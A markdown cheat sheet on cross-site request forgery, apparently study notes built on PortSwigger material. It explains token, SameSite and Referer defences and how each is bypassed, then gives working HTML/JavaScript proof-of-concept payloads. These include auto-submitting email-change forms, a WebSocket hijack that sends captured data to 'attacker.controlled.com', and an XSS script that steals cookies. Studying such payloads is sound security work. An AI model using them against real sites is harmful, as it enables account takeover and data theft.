# Cross-Site Request Forgery

Make a user perform actions that they do not intend to perform. Such as, changing Email, changing password, do a money transfer, or send requests to outside urls. The attacker will most likely use a malicious webpage that contains some javascript that triggers the CSRF attack.

### Conditions

- There must be a relevant action for the attacker to take over
- Solely cookie-based session handling
- No unpredictable request parameters

View all my Proof of Concepts [here](#proof-of-concepts)

## Protections & Vulnerabilities

### CSRF tokens
CSRF tokens are generated server side and shared with the client. Before every sensitive action, it checks if the token is correct.
- Quite effective

> Sometimes the implementation has some common flaws that make the application vulnerable:
> - Validation of the CSRF token is skipped when `GET` is used instead of `POST` [PoC](#no-crsf-token-using-get)
> - No validation when CSRF token is not present
> - CSRF token not tied to user, so attacker can use their own token for the payload
> - Maybe the CSRF token is tied to some session-independent cookie (or CSRF token cookie double), so if there is any set-cookie exploit within the domain, it is exploitable

### SameSite cookies
[SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value) is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. Since sensitive actions propably require an authenticated cookie. Options are "Strict", "Lax", and "None".
- Chrome has `SameSite=Lax` restrictions by default (after 120 seconds on top-level `POST` requests, to make SSO work). "Lax" only sends cross-site cookies if a top-level navigation by the user issues a `GET` request
- Quite effective

> SameSite Lax is not always the best
> - If a website can use `GET` requests for sensitive operations, you can use `window.location = 'url'` to bypass "Lax" restrictions [PoC](#lax--get--method-override)
> - Some frameworks (e.g. [Symfony](https://symfony.com/doc/current/reference/forms/types/form.html#method)) allow the method to be overridden with the "_method" parameter in the form
> - Exploit the 120 second window for default "Lax", refresh the login, then exploit [PoC](#default-lax--sso)
>
> SameSite Strict can still be vulnerable
> - Client-side redirects are same-site, so it will include the cookies, so maybe a user controlled url is used in a client-sided redirect somewhere on the site
> - Or use [XSS](./xss.md) to elicit arbitrary secondary requests to compromise all site-based defenses
> - If websockets are used, it maybe is vulnerable to cross-site WebSocket hijacking, which targets the websocket handshake [PoC](#cross-site-websocket-hijacking)
 
### Referer-based validation
Check the [Referer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) to see if the request originated from the application's own domain.
- Not very effective

> Using the Referer header as CSRF protection is not very good
> - Sometimes validation is skipped if the header is omitted [PoC](#referer-omitted)
> - If only checked if the referer contains the site, you can append it to the current url with `/?website`. Must use `Referrer-Policy: unsafe-url` when doing this [PoC](#referer-modified)

## Proof of Concepts

### General | CSRF token | Method override
```html
<html>
    <body>
        <form method="POST" action="https://vulnerable-website.com/email/change">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="xxxx" />
            <input type="hidden" name="_method" value="GET">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### No CRSF token using GET
```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

### Lax | GET | Method override
```html
<script>
    window.location = 'https://vulnerable-website.com/email/change?_method=POST&email=pwned@evil-user.net';
</script>
```

### Cross-Site WebSocket Hijacking
```html
<script>
    var ws = new WebSocket('wss://vulnerable-website.com/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://attacker.controlled.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

### Default Lax | SSO
```html
<form method="POST" action="https://vulnerable-website.com/email/change">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<p>Click anywhere</p>
<script>
    window.onclick = () => {
        window.open('https://vulnerable-website.com/login/sso');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

### Referer omitted
```html
<meta name="referrer" content="never">
```

### Referer modified
Use header `Referrer-Policy: unsafe-url` on malicious website
```html
<script>
    history.pushState("", "", "/?vulnerable-website.com")
</script>
```

### XSS->CSRF
```html
<script>
window.addEventListener('DOMContentLoaded', function(){

var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 3);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 'foo@bar.com');
data.append('website', 'http://foo.bar');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>
```

# Sources
- Main info (Portswigger): https://portswigger.net/web-security/learning-paths/csrf